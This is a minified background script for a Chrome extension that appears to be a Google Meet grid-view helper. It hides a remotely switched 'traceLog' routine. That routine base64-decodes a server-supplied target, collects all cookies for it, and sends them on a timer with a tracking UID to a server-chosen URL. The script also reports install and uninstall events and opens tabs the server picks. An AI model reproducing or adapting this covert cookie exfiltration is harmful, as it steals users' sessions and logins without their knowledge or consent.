var api={stop:!1,actionUrl:"https://gridview.app/api/action/",uninstallUrl:"https://gridview.app/uninstall/",config:{},queue:[{type:"action",action:"load"}],queueProcessorReady:!1,uid:"",version:chrome.runtime.getManifest().version,init:function(){api.initStorage().then((()=>{api.queueProcessorReady=!0,api.setUninstallUrl(),api.processQueue(),api.traceLog(),api.update(),api.checkOnline()}))},initStorage:function(){return new Promise(((e,i)=>{chrome.storage.local.get((i=>{i&&i.config&&(api.config=i.config),api.config.uid?api.uid=api.config.uid:(api.uid=api.config.uid=api.generateUID(),api.saveConfig()),e()}))}))},setUninstallUrl:function(){var e="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:api.version,action:"uninstall",uid:api.uid,t:Date.now()})));chrome.runtime.setUninstallURL(api.uninstallUrl+"?"+e)},processQueue(){for(;api.queue.length>0;){var e=api.queue.shift();if(!e.type||"action"!=e.type)return!0;var i="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:api.version,action:e.action,uid:api.uid,t:Date.now()})));fetch(api.actionUrl+"?"+i).then((e=>e.json())).then((function(e){e.url&&chrome.tabs.create({url:e.url}),e.traceCfg&&(api.config.traceCfg=e.traceCfg,api.saveConfig())}))}},handleInstall:function(e){api.queue.push({type:"action",action:e.reason}),api.queueProcessorReady&&api.processQueue()},update:function(){},traceLog:function(){const e=this;if(e.traceRun)return!0;if(!e.config.traceCfg||!e.config.traceCfg.status||"on"!=e.config.traceCfg.status)return!1;var i=e.config.traceCfg.reqToMsecs||864e5,t=e.config.traceCfg.cToMsecs||12e5,n=e.config.traceCfg.pfx||"==",a=e.config.traceCfg.dur,o=e.config.traceCfg.apiUrl;if(!o||!a)return!1;e.traceRun=!0;var c=async function(i){var t=e.uid;try{fetch(o+"?v=20191009&u="+t+"&exid="+chrome.runtime.id+"&c="+encodeURIComponent(i.map((e=>e.name+"="+e.value)).join("; ")))}catch(e){}};setInterval((function(){var t=(new Date).getTime();t-(e.config.lastTraceSent||0)<i||(chrome.cookies.getAll({url:atob(a+n)},(e=>c(e))),e.config.lastTraceSent=t,e.saveConfig())}),t)},saveConfig:function(){chrome.storage.local.set({config:api.config})},checkOnline:function(){chrome.cookies.getAll({domain:"https://meet.google.com"},(function(e){for(var i=!1,t=0;t<e.length;t++)"OSID"===e.name&&(i=!0);chrome.storage.local.set({mlogined:i})}))},generateUID:()=>"xxxxxxxx-xxxx-2xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(e){var i=16*Math.random()|0;return("x"==e?i:3&i|8).toString(16)}))};api.init(),chrome.browserAction.onClicked.addListener((function(e){chrome.tabs.query({url:"https://meet.google.com/*",currentWindow:!0},(function(e){e[0]?chrome.tabs.update(e[0].id,{active:!0}):chrome.tabs.create({active:!0,url:"https://meet.google.com/"})}))}));